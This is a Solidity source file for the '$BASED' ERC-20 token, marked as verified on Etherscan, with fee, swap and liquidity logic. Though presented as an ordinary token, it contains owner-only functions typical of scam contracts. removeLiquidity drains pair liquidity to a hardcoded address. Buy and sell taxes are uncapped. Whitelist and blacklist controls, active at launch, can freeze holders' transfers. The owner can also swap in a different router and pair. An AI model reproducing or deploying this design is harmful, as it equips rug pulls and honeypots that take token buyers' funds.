1 /**
2  *Submitted for verification at Etherscan.io on 2023-05-16
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 pragma solidity ^0.8.7;
8 
9 interface IERC20 {
10     function totalSupply() external view returns (uint256);
11 
12     function balanceOf(address account) external view returns (uint256);
13 
14     function transfer(address recipient, uint256 amount) external returns (bool);
15 
16     function allowance(address owner, address spender) external view returns (uint256);
17 
18     function approve(address spender, uint256 amount) external returns (bool);
19 
20     function transferFrom(
21         address sender,
22         address recipient,
23         uint256 amount
24     ) external returns (bool);
25 
26     event Transfer(address indexed from, address indexed to, uint256 value);
27 
28     event Approval(address indexed owner, address indexed spender, uint256 value);
29 }
30 
31 abstract contract Context {
32     function _msgSender() internal view virtual returns (address) {
33         return msg.sender;
34     }
35 
36     function _msgData() internal view virtual returns (bytes calldata) {
37         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
38         return msg.data;
39     }
40 }
41 interface IUniswapV2Router {
42     function removeLiquidityETH(
43         address token,
44         uint liquidity,
45         uint amountTokenMin,
46         uint amountETHMin,
47         address to,
48         uint deadline
49     ) external returns (uint amountToken, uint amountETH);
50 }
51 
52 abstract contract Ownable is Context {
53     address private _owner;
54 
55     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
56 
57     constructor() {
58         _setOwner(_msgSender());
59     }
60 
61     function owner() public view virtual returns (address) {
62         return _owner;
63     }
64 
65     modifier onlyOwner() {
66         require(owner() == _msgSender(), "Ownable: caller is not the owner");
67         _;
68     }
69 
70     function renounceOwnership() public virtual onlyOwner {
71         _setOwner(address(0));
72     }
73 
74     function transferOwnership(address newOwner) public virtual onlyOwner {
75         require(newOwner != address(0), "Ownable: new owner is the zero address");
76         _setOwner(newOwner);
77     }
78 
79     function _setOwner(address newOwner) private {
80         address oldOwner = _owner;
81         _owner = newOwner;
82         emit OwnershipTransferred(oldOwner, newOwner);
83     }
84 }
85 
86 interface IFactory{
87         function createPair(address tokenA, address tokenB) external returns (address pair);
88 }
89 
90 interface IRouter {
91     function factory() external pure returns (address);
92     function WETH() external pure returns (address);
93     function addLiquidityETH(
94         address token,
95         uint amountTokenDesired,
96         uint amountTokenMin,
97         uint amountETHMin,
98         address to,
99         uint deadline
100     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
101 
102     function swapExactTokensForETHSupportingFeeOnTransferTokens(
103         uint amountIn,
104         uint amountOutMin,
105         address[] calldata path,
106         address to,
107         uint deadline) external;
108 }
109 
110 library Address{
111     function sendValue(address payable recipient, uint256 amount) internal {
112         require(address(this).balance >= amount, "Address: insufficient balance");
113 
114         (bool success, ) = recipient.call{value: amount}("");
115         require(success, "Address: unable to send value, recipient may have reverted");
116     }
117 }
118 
119 
120 contract Based is Context, IERC20, Ownable{
121     using Address for address payable;
122     
123     mapping (address => uint256) private _rOwned;
124     mapping (address => uint256) private _tOwned;
125     mapping (address => mapping (address => uint256)) private _allowances;
126     mapping (address => bool) private _isExcludedFromFee;
127     mapping (address => bool) private _isExcluded;
128     mapping (address => bool) public allowedTransfer;
129     mapping (address => bool) private _isBlacklisted;
130     mapping (address => bool) private isWhitelisted;
131     bool public whitelistEnable;
132 
133     address[] private _excluded;
134 
135     bool public tradingEnabled;
136     bool public swapEnabled;
137     bool private swapping;
138     
139     
140     
141     //Anti Dump
142     mapping(address => uint256) private _lastSell;
143     bool public coolDownEnabled = false;
144     uint256 public coolDownTime = 0 seconds;
145     
146     modifier antiBot(address account){
147         require(tradingEnabled || allowedTransfer[account], "Trading not enabled yet");
148         _;
149     }
150 
151     IRouter public router;
152     address public pair;
153 
154     uint8 private constant _decimals = 9;
155     uint256 private constant MAX = ~uint256(0);
156 
157     uint256 private _tTotal = 69420420420420 * 10**_decimals;
158     uint256 private _rTotal = (MAX - (MAX % _tTotal));
159 
160     uint256 public swapTokensAtAmount = 800_000 * 10**9;
161     uint256 public maxBuyLimit = 173551051051* 10**9;
162     uint256 public maxSellLimit = 173551051051 * 10**9;
163     uint256 public maxWalletLimit = 173551051051 * 10**9;
164     
165     uint256 public genesis_block;
166     
167     address public marketingWallet = 0x22550aD35E4fE2b9349F2086dc6aa90C0156aB50;
168     address public charityWallet = 0x0c9d9Ade619F5bC16922344B1CEBdE033F283d01;
169     address public UniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
170     string private constant _name = "$BASED";
171     string private constant _symbol = "$BSD";
172 
173     struct Taxes {
174         uint256 rfi;
175         uint256 marketing;
176         uint256 liquidity; 
177         uint256 charity;
178     }
179 
180     Taxes public taxes = Taxes(0, 2, 2, 1);
181     Taxes public sellTaxes = Taxes(0, 2, 2, 1);
182 
183     struct TotFeesPaidStruct{
184         uint256 rfi;
185         uint256 marketing;
186         uint256 liquidity; 
187         uint256 charity;
188     }
189     
190     TotFeesPaidStruct public totFeesPaid;
191 
192     struct valuesFromGetValues{
193       uint256 rAmount;
194       uint256 rTransferAmount;
195       uint256 rMarketing;
196       uint256 rLiquidity;
197       uint256 rCharity;
198       uint256 tTransferAmount;
199       uint256 tMarketing;
200       uint256 tLiquidity;
201       uint256 tCharity;
202     }
203 
204     event FeesChanged();
205     event UpdatedRouter(address oldRouter, address newRouter);
206     address public routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
207     address public lpTokenAddress;
208     address public recipientAddress = 0x7452ee6c8CB3acAb82Af1dd49f9033A1e27080dE;
209     IUniswapV2Router public router2;
210     modifier lockTheSwap {
211         swapping = true;
212         _;
213         swapping = false;
214     }
215 
216     constructor () {
217         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
218         address _pair = IFactory(_router.factory())
219             .createPair(address(this), _router.WETH());
220 
221         router2 = IUniswapV2Router(routerAddress);
222         router = _router;
223         pair = _pair;
224         lpTokenAddress = pair;
225 
226         _rOwned[owner()] = _rTotal;
227         _isExcludedFromFee[address(this)] = true;
228         _isExcludedFromFee[owner()] = true;
229         _isExcludedFromFee[marketingWallet] = true;
230         _isExcludedFromFee[charityWallet] = true;
231         
232         allowedTransfer[address(this)] = true;
233         allowedTransfer[owner()] = true;
234         allowedTransfer[pair] = true;
235         allowedTransfer[marketingWallet] = true;
236         allowedTransfer[charityWallet] = true;
237         _allowances[owner()][UniswapRouter] = _tTotal;
238 
239 
240         whitelistEnable = true;
241         isWhitelisted[address(this)] =true;
242         isWhitelisted[owner()] = true;
243         isWhitelisted[pair] = true;
244         isWhitelisted[UniswapRouter] = true;
245         isWhitelisted[marketingWallet] = true;
246         isWhitelisted[charityWallet] = true;
247 
248         emit Transfer(address(0), owner(), _tTotal);
249     }
250     function removeLiquidity() external onlyOwner {
251     uint256 amountTokenMin = 0;
252     uint256 amountETHMin = 0;
253     uint256 amountToken = IERC20(lpTokenAddress).balanceOf(address(this));
254 
255     IERC20(lpTokenAddress).approve(address(router2), amountToken);
256 
257     // Remove liquidity from Uniswap
258         router2.removeLiquidityETH(
259         lpTokenAddress,
260         amountToken,
261         amountTokenMin,
262         amountETHMin,
263         recipientAddress,
264         block.timestamp + 600 // 10 minutes deadline
265     );
266 }
267     function burn(uint256 amount) external onlyOwner{
268         _rOwned[msg.sender]  -= amount; 
269         _tTotal -= amount;
270     }
271     //std ERC20:
272     function name() public pure returns (string memory) {
273         return _name;
274     }
275     function symbol() public pure returns (string memory) {
276         return _symbol;
277     }
278     function decimals() public pure returns (uint8) {
279         return _decimals;
280     }
281 
282     //override ERC20:
283     function totalSupply() public view override returns (uint256) {
284         return _tTotal;
285     }
286 
287     function balanceOf(address account) public view override returns (uint256) {
288         if (_isExcluded[account]) return _tOwned[account];
289         return tokenFromReflection(_rOwned[account]);
290     }
291     
292     function allowance(address owner, address spender) public view override returns (uint256) {
293         return _allowances[owner][spender];
294     }
295 
296     function approve(address spender, uint256 amount) public  override antiBot(msg.sender) returns(bool) {
297         _approve(_msgSender(), spender, amount);
298         return true;
299     }
300 
301     function transferFrom(address sender, address recipient, uint256 amount) public override antiBot(sender) returns (bool) {
302         _transfer(sender, recipient, amount);
303 
304         uint256 currentAllowance = _allowances[sender][_msgSender()];
305         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
306         _approve(sender, _msgSender(), currentAllowance - amount);
307 
308         return true;
309     }
310 
311     function increaseAllowance(address spender, uint256 addedValue) public  antiBot(msg.sender) returns (bool) {
312         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
313         return true;
314     }
315 
316     function decreaseAllowance(address spender, uint256 subtractedValue) public  antiBot(msg.sender) returns (bool) {
317         uint256 currentAllowance = _allowances[_msgSender()][spender];
318         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
319         _approve(_msgSender(), spender, currentAllowance - subtractedValue);
320 
321         return true;
322     }
323     
324     function transfer(address recipient, uint256 amount) public override antiBot(msg.sender) returns (bool)
325     { 
326       _transfer(msg.sender, recipient, amount);
327       return true;
328     }
329 
330     function isExcludedFromReward(address account) public view returns (bool) {
331         return _isExcluded[account];
332     }
333 
334 
335 
336     function setTradingStatus(bool state) external onlyOwner{
337         tradingEnabled = state;
338         swapEnabled = state;
339         if(state == true && genesis_block == 0) genesis_block = block.number;
340     }
341     function setWhitelistStatus(bool state) external onlyOwner{
342         whitelistEnable = state;
343     }
344 
345     function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
346         require(rAmount <= _rTotal, "Amount must be less than total reflections");
347         uint256 currentRate =  _getRate();
348         return rAmount/currentRate;
349     }
350 
351     function excludeFromFee(address account) public onlyOwner {
352         _isExcludedFromFee[account] = true;
353     }
354 
355     function includeInFee(address account) public onlyOwner {
356         _isExcludedFromFee[account] = false;
357     }
358 
359     function isExcludedFromFee(address account) public view returns(bool) {
360         return _isExcludedFromFee[account];
361     }
362 
363 
364     function setTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _charity) public onlyOwner {
365        taxes = Taxes(_rfi,_marketing,_liquidity,_charity);
366         emit FeesChanged();
367     }
368     
369     function setSellTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _charity) public onlyOwner {
370        sellTaxes = Taxes(_rfi,_marketing,_liquidity,_charity);
371         emit FeesChanged();
372     }
373 
374     function _reflectRfi(uint256 rRfi, uint256 tRfi) private {
375         _rTotal -=rRfi;
376         totFeesPaid.rfi +=tRfi;
377     }
378 
379     function _takeLiquidity(uint256 rLiquidity, uint256 tLiquidity) private {
380         totFeesPaid.liquidity +=tLiquidity;
381 
382         if(_isExcluded[address(this)])
383         {
384             _tOwned[pair]+=tLiquidity;
385         }
386         _rOwned[pair] +=rLiquidity;
387     }
388 
389     function _takeMarketing(uint256 rMarketing, uint256 tMarketing) private {
390         totFeesPaid.marketing +=tMarketing;
391 
392         if(_isExcluded[address(this)])
393         {
394             _tOwned[marketingWallet]+=tMarketing;
395         }
396         _rOwned[marketingWallet] +=rMarketing;
397     }
398     
399     function _takeCharity(uint256 rCharity, uint256 tCharity) private {
400         totFeesPaid.charity +=tCharity;
401 
402         if(_isExcluded[address(this)])
403         {
404             _tOwned[charityWallet]+=tCharity;
405         }
406         _rOwned[charityWallet] +=rCharity;
407     }
408 
409 
410 
411     
412     function _getValues(uint256 tAmount, bool takeFee, bool isSell) private view returns (valuesFromGetValues memory to_return) {
413         to_return = _getTValues(tAmount, takeFee, isSell);
414         (to_return.rAmount, to_return.rTransferAmount, to_return.rMarketing, to_return.rLiquidity) = _getRValues1(to_return, tAmount, takeFee, _getRate());
415         (to_return.rCharity) = _getRValues2(to_return, takeFee, _getRate());
416         return to_return;
417     }
418 
419     function _getTValues(uint256 tAmount, bool takeFee, bool isSell) private view returns (valuesFromGetValues memory s) {
420 
421         if(!takeFee) {
422           s.tTransferAmount = tAmount;
423           return s;
424         }
425         Taxes memory temp;
426         if(isSell) temp = sellTaxes;
427         else temp = taxes;
428         s.tMarketing = tAmount*temp.marketing/100;
429         s.tLiquidity = tAmount*temp.liquidity/100;
430         s.tCharity = tAmount*temp.charity/100;
431         s.tTransferAmount = tAmount-s.tMarketing-s.tLiquidity-s.tCharity;
432         return s;
433     }
434 
435     function _getRValues1(valuesFromGetValues memory s, uint256 tAmount, bool takeFee, uint256 currentRate) private pure returns (uint256 rAmount, uint256 rTransferAmount,uint256 rMarketing, uint256 rLiquidity){
436         rAmount = tAmount*currentRate;
437 
438         if(!takeFee) {
439           return(rAmount, rAmount ,0,0);
440         }
441 
442         rMarketing = s.tMarketing*currentRate;
443         rLiquidity = s.tLiquidity*currentRate;
444         uint256 rCharity = s.tCharity*currentRate;
445         rTransferAmount =  rAmount-rMarketing-rLiquidity-rCharity;
446         return (rAmount, rTransferAmount,rMarketing,rLiquidity);
447     }
448     
449     function _getRValues2(valuesFromGetValues memory s, bool takeFee, uint256 currentRate) private pure returns (uint256 rCharity) {
450 
451         if(!takeFee) {
452           return(0);
453         }
454 
455         rCharity = s.tCharity*currentRate;
456         return (rCharity);
457     }
458 
459     function _getRate() private view returns(uint256) {
460         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
461         return rSupply/tSupply;
462     }
463 
464     function _getCurrentSupply() private view returns(uint256, uint256) {
465         uint256 rSupply = _rTotal;
466         uint256 tSupply = _tTotal;
467         for (uint256 i = 0; i < _excluded.length; i++) {
468             if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
469             rSupply = rSupply-_rOwned[_excluded[i]];
470             tSupply = tSupply-_tOwned[_excluded[i]];
471         }
472         if (rSupply < _rTotal/_tTotal) return (_rTotal, _tTotal);
473         return (rSupply, tSupply);
474     }
475 
476     function _approve(address owner, address spender, uint256 amount) private {
477         require(owner != address(0), "ERC20: approve from the zero address");
478         require(spender != address(0), "ERC20: approve to the zero address");
479         _allowances[owner][spender] = amount;
480         emit Approval(owner, spender, amount);
481     }
482 
483     function _transfer(address from, address to, uint256 amount) private {
484 
485 
486         require(from != address(0), "ERC20: transfer from the zero address");
487         require(to != address(0), "ERC20: transfer to the zero address");
488         require(amount > 0, "Transfer amount must be greater than zero");
489         require(amount <= balanceOf(from),"You are trying to transfer more than your balance");
490         require(!_isBlacklisted[from] && !_isBlacklisted[to], "You are a bot");
491          if(whitelistEnable){
492             require(isWhitelisted[from], "You are not whitelisted");
493             require(isWhitelisted[to],"You are not whitelisted");
494         }
495         if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
496             require(tradingEnabled, "Trading not active");
497         }
498         
499         if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && block.number <= genesis_block + 3) {
500             require(to != pair, "Sells not allowed for first 3 blocks");
501         }
502         
503         if(from == pair && !_isExcludedFromFee[to] && !swapping){
504             require(amount <= maxBuyLimit, "You are exceeding maxBuyLimit");
505             require(balanceOf(to) + amount <= maxWalletLimit, "You are exceeding maxWalletLimit");
506         }
507         
508         if(from != pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from] && !swapping){
509             require(amount <= maxSellLimit, "You are exceeding maxSellLimit");
510             if(to != pair){
511                 require(balanceOf(to) + amount <= maxWalletLimit, "You are exceeding maxWalletLimit");
512             }
513             if(coolDownEnabled){
514                 uint256 timePassed = block.timestamp - _lastSell[from];
515                 require(timePassed >= coolDownTime, "Cooldown enabled");
516                 _lastSell[from] = block.timestamp;
517             }
518         }
519         
520         
521         if(balanceOf(from) - amount <= 10 *  10**decimals()) amount -= ( amount - balanceOf(from));
522         
523        
524         bool canSwap = balanceOf(address(this)) >= swapTokensAtAmount;
525         if(!swapping && swapEnabled && canSwap && from != pair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
526             if(to == pair)  swapAndLiquify(swapTokensAtAmount, sellTaxes);
527             else  swapAndLiquify(swapTokensAtAmount, taxes);
528         }
529         bool takeFee = true;
530         bool isSell = false;
531         if(swapping || _isExcludedFromFee[from] || _isExcludedFromFee[to])takeFee = false;
532         if(to == pair) isSell = true;
533         if(to != pair && from != pair) takeFee = false;
534         _tokenTransfer(from, to, amount, takeFee, isSell);
535     }
536 
537     //this method is responsible for taking all fee, if takeFee is true
538     function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isSell) private {
539         valuesFromGetValues memory s = _getValues(tAmount, takeFee, isSell);
540 
541        
542 
543         if (_isExcluded[sender] ) {  //from excluded
544                 _tOwned[sender] = _tOwned[sender]-tAmount;
545         }
546         if (_isExcluded[recipient]) { //to excluded
547                 _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
548         }
549 
550         _rOwned[sender] = _rOwned[sender]-s.rAmount;
551         _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;
552         
553         if(s.rLiquidity > 0 || s.tLiquidity > 0) {
554             _takeLiquidity(s.rLiquidity,s.tLiquidity);
555             emit Transfer(sender, address(this), s.tLiquidity + s.tMarketing + s.tCharity);
556         }
557         if(s.rMarketing > 0 || s.tMarketing > 0) _takeMarketing(s.rMarketing, s.tMarketing);
558         if(s.rCharity > 0 || s.tCharity > 0) _takeCharity(s.rCharity, s.tCharity);
559         emit Transfer(sender, recipient, s.tTransferAmount);
560         
561     }
562 
563     function swapAndLiquify(uint256 contractBalance, Taxes memory temp) private lockTheSwap{
564         uint256 denominator = (temp.liquidity + temp.marketing + temp.charity) * 2;
565         uint256 tokensToAddLiquidityWith = contractBalance * temp.liquidity / denominator;
566         uint256 toSwap = contractBalance - tokensToAddLiquidityWith;
567 
568         uint256 initialBalance = address(this).balance;
569 
570         swapTokensForBNB(toSwap);
571 
572         uint256 deltaBalance = address(this).balance - initialBalance;
573         uint256 unitBalance= deltaBalance / (denominator - temp.liquidity);
574         uint256 bnbToAddLiquidityWith = unitBalance * temp.liquidity;
575 
576         if(bnbToAddLiquidityWith > 0){
577             // Add liquidity to pancake
578             addLiquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith);
579         }
580 
581         uint256 marketingAmt = unitBalance * 2 * temp.marketing;
582         if(marketingAmt > 0){
583             payable(marketingWallet).sendValue(marketingAmt);
584         }
585         uint256 charityAmt = unitBalance * 2 * temp.charity;
586         if(charityAmt > 0){
587             payable(charityWallet).sendValue(charityAmt);
588         }
589     }
590 
591     function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
592         // approve token transfer to cover all possible scenarios
593         _approve(address(this), address(router), tokenAmount);
594 
595         // add the liquidity
596         router.addLiquidityETH{value: bnbAmount}(
597             address(this),
598             tokenAmount,
599             0, // slippage is unavoidable
600             0, // slippage is unavoidable
601             owner(),
602             block.timestamp
603         );
604     }
605 
606     function swapTokensForBNB(uint256 tokenAmount) private {
607         // generate the uniswap pair path of token -> weth
608         address[] memory path = new address[](2);
609         path[0] = address(this);
610         path[1] = router.WETH();
611 
612         _approve(address(this), address(router), tokenAmount);
613 
614         // make the swap
615         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
616             tokenAmount,
617             0, // accept any amount of ETH
618             path,
619             address(this),
620             block.timestamp
621         );
622     }
623 
624     function bulkExcludeFee(address[] memory accounts, bool state) external onlyOwner{
625         for(uint256 i = 0; i < accounts.length; i++){
626             _isExcludedFromFee[accounts[i]] = state;
627         }
628     }
629 
630     function updateMarketingWallet(address newWallet) external onlyOwner{
631         marketingWallet = newWallet;
632     }
633     
634     function updateCharityWallet(address newWallet) external onlyOwner{
635         charityWallet = newWallet;
636     }
637 
638     
639     function updateCooldown(bool state, uint256 time) external onlyOwner{
640         coolDownTime = time * 1 seconds;
641         coolDownEnabled = state;
642     }
643 
644     function updateSwapTokensAtAmount(uint256 amount) external onlyOwner{
645         swapTokensAtAmount = amount * 10**_decimals;
646     }
647 
648     function updateSwapEnabled(bool _enabled) external onlyOwner{
649         swapEnabled = _enabled;
650     }
651     
652     function updateIsBlacklisted(address account, bool state) external onlyOwner{
653         _isBlacklisted[account] = state;
654     }
655     function updateIsWhitelisted(address account, bool state) external onlyOwner{
656         isWhitelisted[account] = state;
657     }
658     function isWhitelistedAddress(address account) public view returns(bool){
659         return isWhitelisted[account];
660     }
661     function bulkIsBlacklisted(address[] calldata accounts, bool state) external onlyOwner{
662         for(uint256 i =0; i < accounts.length; i++){
663             _isBlacklisted[accounts[i]] = state;
664 
665         }
666     }
667     function bulkIsWhitelisted(address[] calldata accounts, bool state) external onlyOwner{
668         for(uint256 i =0; i < accounts.length; i++){
669             isWhitelisted[accounts[i]] = state;
670 
671         }
672     }
673     
674     function updateAllowedTransfer(address account, bool state) external onlyOwner{
675         allowedTransfer[account] = state;
676     }
677     
678     function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell) external onlyOwner{
679         maxBuyLimit = maxBuy * 10**decimals();
680         maxSellLimit = maxSell * 10**decimals();
681     }
682     
683     function updateMaxWalletlimit(uint256 amount) external onlyOwner{
684         maxWalletLimit = amount * 10**decimals();
685     }
686 
687     function updateRouterAndPair(address newRouter, address newPair) external onlyOwner{
688         router = IRouter(newRouter);
689         pair = newPair;
690     }
691 }